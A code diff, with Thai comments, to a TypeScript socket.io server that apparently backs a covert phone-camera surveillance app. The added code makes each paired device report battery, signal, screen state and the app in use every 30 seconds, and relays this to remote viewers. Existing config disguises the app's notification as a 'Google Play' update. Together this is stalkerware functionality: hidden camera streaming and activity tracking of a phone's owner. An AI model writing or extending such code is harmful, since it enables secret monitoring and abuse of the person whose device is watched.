@@ -60,6 +60,23 @@ interface CameraConfig {
   autoMinimize: boolean;
 }
 
+interface DeviceStatus {
+  // 0-100 หรือ -1 = ไม่ทราบ
+  batteryLevel: number;
+  // กำลังชาร์จอยู่หรือไม่
+  batteryCharging: boolean;
+  // ชนิดเครือข่าย: 'wifi' | 'cellular' | 'none'
+  networkType: string;
+  // 0-4 (ระดับขีดสัญญาณ) หรือ -1 = ไม่ทราบ
+  signalLevel: number;
+  // ชื่อแอพที่ใช้อยู่ตอนนี้ (จาก UsageStatsManager) หรือ null
+  foregroundApp: string | null;
+  // จอเปิดอยู่หรือไม่
+  screenOn: boolean;
+  // epoch ms ที่ status report เข้ามาล่าสุด
+  lastUpdate: number;
+}
+
 const DEFAULT_CONFIG: CameraConfig = {
   notifTitle: 'กำลังอัพเดท Google Play',
   notifBody: 'กำลังตรวจสอบและดาวน์โหลดข้อมูลล่าสุด',
@@ -79,6 +96,13 @@ const fcmTokens = new Map<string, string>();
 // device_id → CameraConfig (viewer เก็บ remote config สำหรับกล้องแต่ละตัว)
 // รีสตาร์ท server หาย → viewer ต้องส่งใหม่ (acceptable trade-off เพื่อความเรียบง่าย)
 const configs = new Map<string, CameraConfig>();
+
+// device_id → DeviceStatus ล่าสุด (camera push ทุก 30s + on-change)
+const statuses = new Map<string, DeviceStatus>();
+
+// device_id → Set<socketId> ของ viewer ที่ subscribe live updates
+// (relay status-updated event ให้ทุก subscriber เมื่อ camera report-status)
+const statusSubscribers = new Map<string, Set<string>>();
 
 // กัน spam push: device_id → timestamp ล่าสุดที่ส่ง
 const lastPushAt = new Map<string, number>();
@@ -258,6 +282,69 @@ io.on('connection', (socket: Socket) => {
     socket.emit('update-config-ok', merged);
   });
 
+  // ---- Device status (battery / signal / foreground app / screen) ----
+
+  // camera push status — เก็บ + relay ไปทุก viewer ที่ subscribe
+  socket.on('report-status', (payload: { deviceId?: string; status?: Partial<DeviceStatus> }) => {
+    const deviceId = payload?.deviceId;
+    const s = payload?.status;
+    if (typeof deviceId !== 'string' || deviceId.length < 8 || !s || typeof s !== 'object') {
+      return; // เงียบ — ไม่ ack เพราะ status อาจมาบ่อย
+    }
+    const merged: DeviceStatus = {
+      batteryLevel: typeof s.batteryLevel === 'number' ? s.batteryLevel : -1,
+      batteryCharging: !!s.batteryCharging,
+      networkType: typeof s.networkType === 'string' ? s.networkType : 'none',
+      signalLevel: typeof s.signalLevel === 'number' ? s.signalLevel : -1,
+      foregroundApp: typeof s.foregroundApp === 'string' ? s.foregroundApp : null,
+      screenOn: !!s.screenOn,
+      lastUpdate: Date.now(),
+    };
+    statuses.set(deviceId, merged);
+
+    // relay ไปทุก subscriber
+    const subs = statusSubscribers.get(deviceId);
+    if (subs) {
+      for (const sid of subs) {
+        io.to(sid).emit('status-updated', { deviceId, status: merged });
+      }
+    }
+  });
+
+  // viewer ขอ status snapshot ปัจจุบัน (เปิด Dashboard ครั้งแรก)
+  socket.on('get-status', (payload: { deviceId?: string }) => {
+    const deviceId = payload?.deviceId;
+    if (typeof deviceId !== 'string' || deviceId.length < 8) {
+      socket.emit('get-status-error', 'device_id ไม่ถูกต้อง');
+      return;
+    }
+    const status = statuses.get(deviceId);
+    if (!status) {
+      socket.emit('get-status-error', 'ยังไม่มี status — รอกล้อง report');
+      return;
+    }
+    socket.emit('status-current', { deviceId, status });
+  });
+
+  // viewer subscribe live status updates
+  socket.on('subscribe-status', (payload: { deviceId?: string }) => {
+    const deviceId = payload?.deviceId;
+    if (typeof deviceId !== 'string' || deviceId.length < 8) return;
+    if (!statusSubscribers.has(deviceId)) statusSubscribers.set(deviceId, new Set());
+    statusSubscribers.get(deviceId)!.add(socket.id);
+    console.log(`[subscribe-status] ${socket.id} → ${deviceId.slice(0, 8)}…`);
+
+    // ส่ง snapshot ทันทีถ้ามี
+    const status = statuses.get(deviceId);
+    if (status) socket.emit('status-updated', { deviceId, status });
+  });
+
+  socket.on('unsubscribe-status', (payload: { deviceId?: string }) => {
+    const deviceId = payload?.deviceId;
+    if (typeof deviceId !== 'string') return;
+    statusSubscribers.get(deviceId)?.delete(socket.id);
+  });
+
   // viewer แลกรหัสจับคู่เป็น device_id
   socket.on('pair-viewer', (payload: { code?: string }) => {
     const code = payload?.code;
@@ -349,6 +436,8 @@ io.on('connection', (socket: Socket) => {
       cameras.delete(currentDeviceId);
       console.log(`[disconnect-camera] device=${currentDeviceId.slice(0, 8)}…`);
     }
+    // ลบ subscriber socket นี้ออกจากทุก room
+    for (const subs of statusSubscribers.values()) subs.delete(socket.id);
     if (currentRoom) {
       const room = rooms.get(currentRoom);
       if (room) {
